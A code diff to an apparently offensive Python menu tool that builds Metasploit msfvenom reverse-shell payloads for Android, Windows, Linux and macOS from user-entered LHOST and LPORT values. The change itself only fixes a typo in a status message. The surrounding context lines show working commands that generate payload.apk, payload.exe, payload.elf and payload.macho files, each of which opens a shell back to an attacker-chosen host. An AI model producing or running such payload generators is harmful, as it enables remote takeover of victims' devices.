@@ -51,7 +51,6 @@ Select option to create listner\n"""+CY+"""
 
 99) Back to main menu\n""")
     
-
     def sel():
         c=int(input(G+"Select your choice >>"+W+" "))
         # Create payload
@@ -61,7 +60,7 @@ Select option to create listner\n"""+CY+"""
                 if ch==1:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerting payload..........\n")
+                    print(B+"\nGernerating payload..........\n")
                     st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.apk"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.apk'+G+" in 'payload' folder"+R+" <<<\n")
@@ -71,7 +70,7 @@ Select option to create listner\n"""+CY+"""
                 elif ch==2:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerting payload..........\n")
+                    print(B+"\nGernerating payload..........\n")
                     st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.exe"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.exe'+G+" in 'payload' folder"+R+" <<<\n")
@@ -81,7 +80,7 @@ Select option to create listner\n"""+CY+"""
                 elif ch==3:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerting payload..........\n")
+                    print(B+"\nGernerating payload..........\n")
                     st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.elf"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.elf'+G+" in 'payload' folder"+R+" <<<\n")
@@ -91,7 +90,7 @@ Select option to create listner\n"""+CY+"""
                 elif ch==4:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print(B+"\nGernerting payload..........\n")
+                    print(B+"\nGernerating payload..........\n")
                     st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.macho"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.macho'+G+" in 'payload' folder"+R+" <<<\n")
